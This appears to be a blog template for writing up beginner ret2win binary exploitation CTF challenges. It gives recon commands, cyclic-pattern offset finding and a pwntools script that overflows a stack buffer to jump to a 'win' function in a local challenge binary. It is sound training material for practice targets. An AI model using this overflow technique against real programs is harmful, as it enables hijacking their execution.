---
title: "ret2win Template - Binary Exploitation"
published: 2026-06-07
description: "A reusable structure for documenting beginner ret2win and stack overflow challenges."
image: ""
tags: ["pwn", "binary-exploitation", "gdb", "pwntools", "ret2win"]
category: "CTF Writeups"
draft: false
lang: ""
---

## Challenge Info

- **Platform:** Replace with platform name
- **Category:** Binary Exploitation
- **Difficulty:** Easy
- **Files:** `challenge`, `libc.so.6` if provided
- **Goal:** Redirect execution to the hidden win function

## Recon

Start by checking the binary protections.

```shellsession
$ file ./challenge
$ checksec --file=./challenge
```

Useful first questions:

- Is NX enabled?
- Is PIE enabled?
- Is there a stack canary?
- Are symbols still present?

## Static Analysis

Look for the win function and unsafe input.

```shellsession
$ objdump -d ./challenge | grep -i win
$ strings ./challenge
```

In Ghidra or Cutter, identify:

- input buffer size
- vulnerable function
- address of `win` or equivalent function

## Finding The Offset

Use a cyclic pattern to find the return address offset.

```python
from pwn import *

payload = cyclic(200)
print(payload)
```

Crash the binary, inspect the overwritten instruction pointer, then calculate:

```python
from pwn import *

print(cyclic_find(0x6161616c))
```

## Exploit

Replace `OFFSET` and `WIN_ADDRESS`.

```python
from pwn import *

elf = context.binary = ELF("./challenge")

OFFSET = 40
WIN_ADDRESS = elf.symbols["win"]

payload = flat(
    b"A" * OFFSET,
    WIN_ADDRESS,
)

p = process()
p.sendline(payload)
p.interactive()
```

## Flag

```text
flag{replace_with_flag_or_result}
```

## Lessons Learned

- What protection mattered most?
- What did the crash reveal?
- What would change if PIE or canary were enabled?
